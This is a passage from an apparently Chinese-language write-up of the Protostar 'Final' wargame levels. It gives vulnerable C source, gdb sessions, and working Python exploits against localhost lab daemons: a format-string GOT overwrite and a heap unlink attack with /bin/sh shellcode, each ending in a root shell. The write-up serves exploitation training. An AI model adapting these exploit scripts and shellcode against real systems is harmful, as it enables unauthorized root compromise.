[ 64 ]; void logit ( char * pw ) { char buf [ 512 ]; snprintf ( buf , sizeof ( buf ), \"Login from %s as [%s] with password [%s] \\n \" , hostname , username , pw ); syslog ( LOG_USER | LOG_DEBUG , buf ); // void syslog(int priority, const char *format, ...); // buf is the format string! 0v0 } void trim ( char * str ) { char * q ; q = strchr ( str , '\\r' ); if ( q ) * q = 0 ; q = strchr ( str , '\\n' ); if ( q ) * q = 0 ; } void parser () { char line [ 128 ]; printf ( \"[final1] $ \" ); while ( fgets ( line , sizeof ( line ) -1 , stdin )) { trim ( line ); if ( strncmp ( line , \"username \" , 9 ) == 0 ) { strcpy ( username , line + 9 ); } else if ( strncmp ( line , \"login \" , 6 ) == 0 ) { if ( username [ 0 ] == 0 ) { printf ( \"invalid protocol \\n \" ); } else { logit ( line + 6 ); printf ( \"login failed \\n \" ); } } printf ( \"[final1] $ \" ); } } void getipport () { int l ; struct sockaddr_in sin ; // struct sockaddr_in { // sa_family_t sin_family; /* address family: AF_INET */ // in_port_t sin_port; /* port in network byte order */ // struct in_addr sin_addr; /* internet address */ // }; // /* Internet address. */ // struct in_addr { // uint32_t s_addr; /* address in network byte order */ // }; l = sizeof ( struct sockaddr_in ); // int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen); // getpeername() returns the address of the peer connected to the socket sockfd, in the buffer pointed to by addr. if ( getpeername ( 0 , & sin , & l ) == -1 ) { err ( 1 , \"you don't exist\" ); } sprintf ( hostname , \"%s:%d\" , inet_ntoa ( sin . sin_addr ), ntohs ( sin . sin_port )); } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); getipport (); parser (); } \u6b63\u786e\u4f7f\u7528 login \u540e\u53ef\u4ee5\u5728 /var/log/syslog \u4e2d\u770b\u5230\u767b\u5f55\u5c1d\u8bd5\u65e5\u5fd7 \u770b\u4e0a\u53bb\u4f3c\u4e4e\u6ca1\u6709\u53ef\u63a7\u5236\u7684 printf \uff0c\u4f46 syslog \u7c7b\u4f3c\u4e8e printf \uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u56e0\u800c\u53ef\u4ee5\u901a\u8fc7 username \u548c pw \u6765\u63a7\u5236\uff0c\u63a5\u4e0b\u6765\u53ef\u4ee5\u4fee\u6539 strncmp \u51fd\u6570 GOT \u8868\u7684\u6761\u76ee\u5730\u5740 \u83b7\u53d6 strncmp \u51fd\u6570 GOT \u8868\u7684\u6761\u76ee\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # gdb --pid `pidof final1` ( gdb ) info functions strncmp All functions matching regular expression \"strncmp\" : File strncmp.c: int *__GI_strncmp ( const char *, const char *, size_t ) ; File ../sysdeps/i386/i486/bits/string.h: int __strncmp_g ( const char *, const char *, size_t ) ; Non-debugging symbols: 0x08048d9c strncmp 0x08048d9c strncmp@plt Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) x/2i 0x08048d9c 0x8048d9c <strncmp@plt>: jmp *0x804a1a8 0x8048da2 <strncmp@plt+6>: push $0 x160 ( gdb ) x/wx 0x804a1a8 0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>: 0x08048da2 \u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 On a real modern system you would first have to leak addresses from memory in order to calculate offsets and break ASLR 1 2 ( gdb ) x system # part of libc 0xb7ecffb0 <__libc_system>: 0x890cec83 \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 4 5 $ nc 127 .0.0.1 2994 [ final1 ] $ username AAAA %x %x %x %x %x %x %x %x [ final1 ] $ login BBBB %x %x %x %x %x %x %x %x login failed [ final1 ] $ ^C \u6700\u77ed hostname \u4e3a x.x.x.x:x \uff08\u957f\u5ea6\u4e3a \\(9\\) \uff09\uff0c\u6700\u957f hostname \u4e3a xxx.xxx.xxx.xxx:xxxxx \uff08\u957f\u5ea6\u4e3a \\(21\\) \uff09\uff0c\u4e3a\u4e86\u5bf9\u9f50\uff0c\u9700\u8981\u8fdb\u884c\u586b\u5145\uff0c\u6839\u636e hostname \u7684\u957f\u5ea6\u8303\u56f4\u53ef\u4ee5\u7edf\u4e00\u586b\u5145\u5230 \\(24\\) \u5b57\u8282\uff0c\u8fd9\u6837\u4e00\u6765\u5c31\u53ef\u4ee5\u56fa\u5b9a\u5199\u5165\u7b2c \\(17\\) \u4e2a\u53c2\u6570\u6240\u6307\u5411\u7684\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import socket , struct def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) ip , port = s . getsockname () hostname = ip + ':' + str ( port ) # \u964d\u4f4e\u53d8\u957f hostname \u7684\u5f71\u54cd pad = 'A' * ( 24 - len ( hostname )) username = pad + 'BBBB' + ' %08x ' * 20 login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) \u63a5\u4e0b\u6765\u67e5\u770b\u5df2\u6253\u5370\u5b57\u7b26\u6570\u91cf\uff0c\u5e76\u786e\u5b9a\u5269\u4f59\u9700\u8981\u5b57\u7b26\u7684\u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import socket , struct def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) strncmp = struct . pack ( 'I' , 0x804a1a8 ) ip , port = s . getsockname () hostname = ip + ':' + str ( port ) pad = 'A' * ( 24 - len ( hostname )) username = pad + 'BBBB' + strncmp + '%18$n' login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) raw_input ( 'waiting... hit [enter]' ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python final.py [ final1 ] $ [ final1 ] $ login failed [ final1 ] $ waiting... hit [ enter ] # open another terminal # pidof final1 21600 1516 # gdb --pid 21600 ( gdb ) x/wx 0x804a1a8 0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>: 0x00000030 Current language: auto The current source language is \"auto; currently asm\" . Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import socket , struct , telnetlib def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) strncmp_got = 0x804a1a8 ip , port = s . getsockname () hostname = ip + ':' + str ( port ) pad = 'A' * ( 24 - len ( hostname )) username = pad + struct . pack ( 'I' , strncmp_got ) + struct . pack ( 'I' , strncmp_got + 2 ) + ' %65408x ' + '%17$n' + ' %47164x ' + '%18$n' # 65408 = 0xffb0 - 0x30 # 47164 = 0xb7ec - 0xffb0 login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) t = telnetlib . Telnet () t . sock = s t . interact () 1 2 3 4 5 6 7 8 9 $ python final.py [ final1 ] $ [ final1 ] $ login failed [ final1 ] $ id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) [ final1 ] $ whoami root Final 2 \u00b6 Remote heap level :) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #include \"../common/common.c\" #include \"../common/malloc.c\" #define NAME \"final2\" #define UID 0 #define GID 0 #define PORT 2993 #define REQSZ 128 void check_path ( char * buf ) { char * start ; char * p ; int l ; /* * Work out old software bug */ p = rindex ( buf , '/' ); // index, rindex - locate character in string // The rindex() function returns a pointer to the last occurrence of the character c in the string s. l = strlen ( p ); if ( p ) { start = strstr ( buf , \"ROOT\" ); // strstr - locate a substring if ( start ) { while ( * start != '/' ) start -- ; // \u5e76\u4e0d\u68c0\u67e5\u662f\u5426\u5728\u5b57\u7b26\u4e32\u5185 memmove ( start , p , l ); // void *memmove(void *dest, const void *src, size_t n); printf ( \"moving from %p to %p (exploit: %s / %d) \\n \" , p , start , start < buf ? \"yes\" : \"no\" , start - buf ); } } } int get_requests ( int fd ) { char * buf ; char * destroylist [ 256 ]; int dll ; int i ; dll = 0 ; while ( 1 ) { if ( dll >= 255 ) break ; buf = calloc ( REQSZ , 1 ); // 128 bytes, the chunk size is bigger than MAX_FAST_SIZE(80) if ( read ( fd , buf , REQSZ ) != REQSZ ) break ; if ( strncmp ( buf , \"FSRD\" , 4 ) != 0 ) break ; check_path ( buf + 4 ); dll ++ ; } for ( i = 0 ; i < dll ; i ++ ) { write ( fd , \"Process OK \\n \" , strlen ( \"Process OK \\n \" )); free ( destroylist [ i ]); // \u6309\u5206\u914d\u7684\u987a\u5e8f\u91ca\u653e } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); get_requests ( fd ); } \u8f93\u5165\u5b57\u7b26\u4e32\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u4ee5 FSRD \u5f00\u5934\uff0c\u603b\u957f\u5ea6\u4e3a 128 \u5b57\u8282 \u5305\u542b / \u548c\u5b50\u4e32 ROOT \u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55/\u5f53\u524d\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u521b\u5efa .gdbinit \uff0c\u5199\u5165\u6bcf\u6b21\u542f\u52a8 gdb \u65f6\u5e0c\u671b\u6267\u884c\u7684\u547d\u4ee4 1 2 set disassembly-flavor intel set pagination off \u91cd\u70b9\u5173\u6ce8 check_path \uff0c\u5229\u7528 / \u67e5\u627e\u548c memmove \u4fee\u6539\u5806\uff0c\u5e76\u501f\u52a9 free \u5b8c\u6210 unlink \u653b\u51fb Dump of assembler code for function check_path 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 0x0804bcd0 <check_path+0>: push ebp 0x0804bcd1 <check_path+1>: mov ebp,esp 0x0804bcd3 <check_path+3>: sub esp,0x28 0x0804bcd6 <check_path+6>: mov DWORD PTR [ esp+0x4 ] ,0x2f 0x0804bcde <check_path+14>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bce1 <check_path+17>: mov DWORD PTR [ esp ] ,eax 0x0804bce4 <check_path+20>: call 0x8048f7c <rindex@plt> 0x0804bce9 <check_path+25>: mov DWORD PTR [ ebp-0x10 ] ,eax 0x0804bcec <check_path+28>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bcef <check_path+31>: mov DWORD PTR [ esp ] ,eax 0x0804bcf2 <check_path+34>: call 0x8048edc <strlen@plt> 0x0804bcf7 <check_path+39>: mov DWORD PTR [ ebp-0xc ] ,eax 0x0804bcfa <check_path+42>: cmp DWORD PTR [ ebp-0x10 ] ,0x0 0x0804bcfe <check_path+46>: je 0x804bd45 <check_path+117> 0x0804bd00 <check_path+48>: mov DWORD PTR [ esp+0x4 ] ,0x804c2cc 0x0804bd08 <check_path+56>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bd0b <check_path+59>: mov DWORD PTR [ esp ] ,eax 0x0804bd0e <check_path+62>: call 0x8048f4c <strstr@plt> 0x0804bd13 <check_path+67>: mov DWORD PTR [ ebp-0x14 ] ,eax 0x0804bd16 <check_path+70>: cmp DWORD PTR [ ebp-0x14 ] ,0x0 0x0804bd1a <check_path+74>: je 0x804bd45 <check_path+117> 0x0804bd1c <check_path+76>: jmp 0x804bd22 <check_path+82> 0x0804bd1e <check_path+78>: sub DWORD PTR [ ebp-0x14 ] ,0x1 0x0804bd22 <check_path+82>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd25 <check_path+85>: movzx eax,BYTE PTR [ eax ] 0x0804bd28 <check_path+88>: cmp al,0x2f 0x0804bd2a <check_path+90>: jne 0x804bd1e <check_path+78> 0x0804bd2c <check_path+92>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804bd2f <check_path+95>: mov DWORD PTR [ esp+0x8 ] ,eax 0x0804bd33 <check_path+99>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bd36 <check_path+102>: mov DWORD PTR [ esp+0x4 ] ,eax 0x0804bd3a <check_path+106>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd3d <check_path+109>: mov DWORD PTR [ esp ] ,eax 0x0804bd40 <check_path+112>: call 0x8048f8c <memmove@plt> 0x0804bd45 <check_path+117>: leave 0x0804bd46 <check_path+118>: ret \u67e5\u770b\u5806\u7684\u8d77\u59cb\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 # gdb -p 1497 Attaching to process 1497 ( gdb ) set follow-fork-mode child Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) break *0x0804bd40 Breakpoint 1 at 0x804bd40: file final2/final2.c, line 27 . ( gdb ) c Continuing. [ New process 1743 ] [ Switching to process 1743 ] Breakpoint 1 , 0x0804bd40 in check_path ( buf = 0x804e00c \"AAAA/ROOT/BBBB/CCCC\" ) at final2/final2.c:27 Current language: auto The current source language is \"auto; currently c\" . ( gdb ) info proc mappings process 1743 cmdline = '/opt/protostar/bin/final2' cwd = '/' exe = '/opt/protostar/bin/final2' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804d000 0x5000 0 /opt/protostar/bin/final2 0x804d000 0x804e000 0x1000 0x4000 /opt/protostar/bin/final2 0x804e000 0x804f000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] \u56e0\u4e3a\u672c\u8eab\u5206\u914d\u7684 chunk \u5927\u5c0f\u5373\u5927\u4e8e MAX_FAST_SIZE \uff0c\u56e0\u800c\u5728\u91ca\u653e\u7b2c\u4e00\u4e2a chunk \u65f6\uff0c\u82e5\u4e0b\u4e00\u4e2a chunk \u672a\u88ab\u4f7f\u7528\uff0c\u5c06\u8fdb\u884c unlink \uff0c\u5229\u7528\u51fd\u6570 check_path \u4fee\u6539\u7b2c\u4e8c\u4e2a chunk \u5728\u6267\u884c free \u4e4b\u540e\uff0c\u53ef\u4f5c\u4e3a\u4fee\u6539 GOT \u8868\u6761\u76ee\u7684\u76ee\u6807\u51fd\u6570\u4e3a write \u548c strlen \uff08\u9009\u62e9 write \uff09 Dump of assembler code for function get_requests 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 0x0804bd47 <get_requests+0>: push ebp 0x0804bd48 <get_requests+1>: mov ebp,esp 0x0804bd4a <get_requests+3>: sub esp,0x428 0x0804bd50 <get_requests+9>: mov DWORD PTR [ ebp-0x10 ] ,0x0 0x0804bd57 <get_requests+16>: cmp DWORD PTR [ ebp-0x10 ] ,0xfe 0x0804bd5e <get_requests+23>: jg 0x804bddb <get_requests+148> 0x0804bd60 <get_requests+25>: mov DWORD PTR [ esp+0x4 ] ,0x1 0x0804bd68 <get_requests+33>: mov DWORD PTR [ esp ] ,0x80 0x0804bd6f <get_requests+40>: call 0x804b4ee <calloc> 0x0804bd74 <get_requests+45>: mov DWORD PTR [ ebp-0x14 ] ,eax 0x0804bd77 <get_requests+48>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bd7a <get_requests+51>: mov edx,DWORD PTR [ ebp-0x14 ] 0x0804bd7d <get_requests+54>: mov DWORD PTR [ ebp+eax*4-0x414 ] ,edx 0x0804bd84 <get_requests+61>: add DWORD PTR [ ebp-0x10 ] ,0x1 0x0804bd88 <get_requests+65>: mov DWORD PTR [ esp+0x8 ] ,0x80 0x0804bd90 <get_requests+73>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd93 <get_requests+76>: mov DWORD PTR [ esp+0x4 ] ,eax 0x0804bd97 <get_requests+80>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bd9a <get_requests+83>: mov DWORD PTR [ esp ] ,eax 0x0804bd9d <get_requests+86>: call 0x8048e5c <read@plt> 0x0804bda2 <get_requests+91>: cmp eax,0x80 0x0804bda7 <get_requests+96>: jne 0x804bdde <get_requests+151> 0x0804bda9 <get_requests+98>: mov DWORD PTR [ esp+0x8 ] ,0x4 0x0804bdb1 <get_requests+106>: mov DWORD PTR [ esp+0x4 ] ,0x804c2d1 0x0804bdb9 <get_requests+114>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bdbc <get_requests+117>: mov DWORD PTR [ esp ] ,eax 0x0804bdbf <get_requests+120>: call 0x8048fdc <strncmp@plt> 0x0804bdc4 <get_requests+125>: test eax,eax 0x0804bdc6 <get_requests+127>: jne 0x804bde1 <get_requests+154> 0x0804bdc8 <get_requests+129>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bdcb <get_requests+132>: add eax,0x4 0x0804bdce <get_requests+135>: mov DWORD PTR [ esp ] ,eax 0x0804bdd1 <get_requests+138>: call 0x804bcd0 <check_path> 0x0804bdd6 <get_requests+143>: jmp 0x804bd57 <get_requests+16> 0x0804bddb <get_requests+148>: nop 0x0804bddc <get_requests+149>: jmp 0x804bde2 <get_requests+155> 0x0804bdde <get_requests+151>: nop 0x0804bddf <get_requests+152>: jmp 0x804bde2 <get_requests+155> 0x0804bde1 <get_requests+154>: nop 0x0804bde2 <get_requests+155>: mov DWORD PTR [ ebp-0xc ] ,0x0 0x0804bde9 <get_requests+162>: jmp 0x804be1c <get_requests+213> 0x0804bdeb <get_requests+164>: mov DWORD PTR [ esp+0x8 ] ,0xb 0x0804bdf3 <get_requests+172>: mov DWORD PTR [ esp+0x4 ] ,0x804c2d6 0x0804bdfb <get_requests+180>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bdfe <get_requests+183>: mov DWORD PTR [ esp ] ,eax 0x0804be01 <get_requests+186>: call 0x8048dfc <write@plt> 0x0804be06 <get_requests+191>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804be09 <get_requests+194>: mov eax,DWORD PTR [ ebp+eax*4-0x414 ] 0x0804be10 <get_requests+201>: mov DWORD PTR [ esp ] ,eax 0x0804be13 <get_requests+204>: call 0x804a9c2 <free> 0x0804be18 <get_requests+209>: add DWORD PTR [ ebp-0xc ] ,0x1 0x0804be1c <get_requests+213>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804be1f <get_requests+216>: cmp eax,DWORD PTR [ ebp-0x10 ] 0x0804be22 <get_requests+219>: jl 0x804bdeb <get_requests+164> 0x0804be24 <get_requests+221>: leave 0x0804be25 <get_requests+222>: ret 1 2 3 4 ( gdb ) x/i 0x8048dfc 0x8048dfc <write@plt>: jmp DWORD PTR ds:0x804d41c ( gdb ) x/wx 0x804d41c 0x804d41c <_GLOBAL_OFFSET_TABLE_+64>: 0xb7f53c70 \u4e0e Heap 3 \u4e0d\u540c\uff0c\u9700\u8981\u83b7\u5f97 shell\uff0c\u53c8\u56e0\u4e3a\u6709 BK->fd \u5199\u56de\uff0c \\(8\\) \u5b57\u8282\u4e0d\u8db3\u4ee5\u653e\u4e0b\u6240\u6709 shellcode\uff0c\u53ef\u5229\u7528 jmp \uff0c\u4f7f\u7528 Online Assembler and Disassembler \u8f6c\u6362\u4e3a shellcode 1 2 # jmp 0xc \\x eb \\x 0a Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import socket , struct , telnetlib REQSZ = 128 def pad ( m ): return ( 'FSRD' + m ) . ljust ( REQSZ , ' \\x00 ' )[: REQSZ ] s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2993 )) jmp = \" \\xeb\\x0a \" shellcode = \" \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 \" s . send ( pad ( '/ROOT' + '/' * 0xf + jmp + ' \\x90 ' * 0xa + shellcode + '/' * 0x80 )) fake_chunk = struct . pack ( \"I\" , 0xfffffffc ) * 2 + struct . pack ( \"I\" , 0x804d41c - 0xc ) + struct . pack ( \"I\" , 0x804e020 ) s . send ( pad ( 'ROOT/' + fake_chunk )) t = telnetlib . Telnet () t . sock = s t . interact () 1 2 3 4 5 6 7 8 9 $ python final.py Process OK id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) whoami root exit *** Connection closed by remote host ***","title":"Final"},{"location":"wargames/protostar/final/#final-0","text":"You may wish to use a toupper() proof shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \"../common/common.c\" #define NAME \"final0\" #define UID 0 #define GID 0 #define PORT 2995 /* * Read the username in from the network */ char * get_username () { char buffer [ 512 ]; char * q ; int i ; memset ( buffer , 0 , sizeof ( buffer )); gets ( buffer ); // reads a line from stdin into the buffer until either a terminating newline or EOF, which it replaces with '\\0' /* Strip off trailing new line characters */ q = strchr ( buffer , '\\n' ); if ( q ) * q = 0 ; q = strchr ( buffer , '\\r' ); if ( q ) * q = 0 ; /* Convert to lower case */ for ( i = 0 ; i < strlen ( buffer ); i ++ ) { buffer [ i ] = toupper ( buffer [ i ]); } /* Duplicate the string and return it */ return strdup ( buffer ); } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); username = get_username (); printf ( \"No such user %s \\n \" , username ); } gets \u4e0d\u5904\u7406 \\0 \uff0c\u800c strlen \u901a\u8fc7 \\0 \u6765\u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u524d\u7f6e \\0 \u6765\u7ed5\u8fc7 toupper Core files will be in /tmp \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\uff08 man core \uff09 The default action of certain signals is to cause a process to terminate and produce a core dump file, a disk file containing an image of the process's memory at the time of termination. \u5e38\u89c1 Signal \u5982\u4e0b Signal Action Comment SIGINT Term Interrupt from keyboard SIGILL Core Illegal Instruction SIGSEGV Core Invalid memory reference \u9996\u5148\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u83b7\u5f97\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7528\u4e8e\u8c03\u8bd5\u5e76\u786e\u5b9a\u6ea2\u51fa\u70b9 1 2 3 4 5 6 7 8 $ python -c \"print 'a'*512 + '\\x00'*4 + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll'\" | nc localhost 2995 $ ls /tmp/core* /tmp/core.11.final0.18906 $ su root # gdb final0 /tmp/core.11.final0.18906 Core was generated by ` /opt/protostar/bin/final0 ` . Program terminated with signal 11 , Segmentation fault. #0 0x65656565 in ?? () # eeee \u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fdb\u7a0b\u8c03\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 # gdb -p `pidof final0` accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64 64 in ../sysdeps/unix/sysv/linux/i386/socket.S ( gdb ) set follow-fork-mode child # \u8ddf\u8e2a\u5b50\u8fdb\u7a0b Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) c Continuing. [ New process 19058 ] # another terminal sends the payload Program received signal SIGSEGV, Segmentation fault. [ Switching to process 19058 ] 0x65656565 in ?? () \u67e5\u770b ret2libc \u51fd\u6570\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # gdb -p `pidof final0` accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64 64 in ../sysdeps/unix/sysv/linux/i386/socket.S ( gdb ) info functions @plt All functions matching regular expression \"@plt\" : Non-debugging symbols: 0x080489fc __errno_location@plt 0x08048a0c srand@plt 0x08048a1c open@plt ... 0x08048c0c execve@plt ... 0xb7fe380c ___tls_get_addr@plt 0xb7fe381c free@plt Current language: auto The current source language is \"auto; currently asm\" . \u89c2\u5bdf\u5982\u4f55\u6784\u9020\u6808\u6765\u6b63\u786e\u5730\u8c03\u7528 execve() 1 2 3 4 5 void main () { execve ( \"/bin/sh\" , 0 , 0 ); // int execve(const char *filename, char *const argv[], char *const envp[]); // no arguments and environment variables } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ gcc execve_example.c -o execve_example $ gdb ./execve_example ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push ebp 0x080483c5 <main+1>: mov ebp,esp 0x080483c7 <main+3>: and esp,0xfffffff0 0x080483ca <main+6>: sub esp,0x10 0x080483cd <main+9>: mov DWORD PTR [ esp+0x8 ] ,0x0 0x080483d5 <main+17>: mov DWORD PTR [ esp+0x4 ] ,0x0 0x080483dd <main+25>: mov DWORD PTR [ esp ] ,0x80484b0 0x080483e4 <main+32>: call 0x80482fc <execve@plt> 0x080483e9 <main+37>: leave 0x080483ea <main+38>: ret End of assembler dump. ( gdb ) break *0x080483e4 Breakpoint 1 at 0x80483e4 ( gdb ) r Starting program: /tmp/execve_example Breakpoint 1 , 0x080483e4 in main () ( gdb ) si 0x080482fc in execve@plt () ( gdb ) x/8wx $esp 0xbffff69c: 0x080483e9 0x080484b0 0x00000000 0x00000000 0xbffff6ac: 0xb7fd7ff4 0x08048400 0x00000000 0xbffff738 ( gdb ) x/2i 0x080483e9 0x80483e9 <main+37>: leave 0x80483ea <main+38>: ret ( gdb ) x/s 0x080484b0 0x80484b0: \"/bin/sh\" \u83b7\u53d6 /bin/sh \u5728 libc \u4e2d\u7684\u504f\u79fb 1 2 3 4 5 6 7 8 9 $ ldd execve_example # get paths to all loaded libraries linux-gate.so.1 = > ( 0xb7fe4000 ) libc.so.6 = > /lib/libc.so.6 ( 0xb7e99000 ) /lib/ld-linux.so.2 ( 0xb7fe5000 ) $ grep -a -b -o /bin/sh /lib/libc.so.6 1176511 :/bin/sh # -a, --text equivalent to --binary-files=text # -b, --byte-offset print the byte offset with output lines # -o, --only-matching show only the part of a line matching PATTERN \u67e5\u770b libc \u7684\u8d77\u59cb\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # pidof final0 1514 # cat /proc/1514/maps 08048000 -0804a000 r-xp 00000000 00 :10 2220 /opt/protostar/bin/final0 0804a000-0804b000 rwxp 00001000 00 :10 2220 /opt/protostar/bin/final0 b7e96000-b7e97000 rwxp 00000000 00 :00 0 b7e97000-b7fd5000 r-xp 00000000 00 :10 759 /lib/libc-2.11.2.so b7fd5000-b7fd6000 ---p 0013e000 00 :10 759 /lib/libc-2.11.2.so b7fd6000-b7fd8000 r-xp 0013e000 00 :10 759 /lib/libc-2.11.2.so b7fd8000-b7fd9000 rwxp 00140000 00 :10 759 /lib/libc-2.11.2.so b7fd9000-b7fdc000 rwxp 00000000 00 :00 0 b7fe0000-b7fe2000 rwxp 00000000 00 :00 0 b7fe2000-b7fe3000 r-xp 00000000 00 :00 0 [ vdso ] b7fe3000-b7ffe000 r-xp 00000000 00 :10 741 /lib/ld-2.11.2.so b7ffe000-b7fff000 r-xp 0001a000 00 :10 741 /lib/ld-2.11.2.so b7fff000-b8000000 rwxp 0001b000 00 :10 741 /lib/ld-2.11.2.so bffeb000-c0000000 rwxp 00000000 00 :00 0 [ stack ]","title":"Final 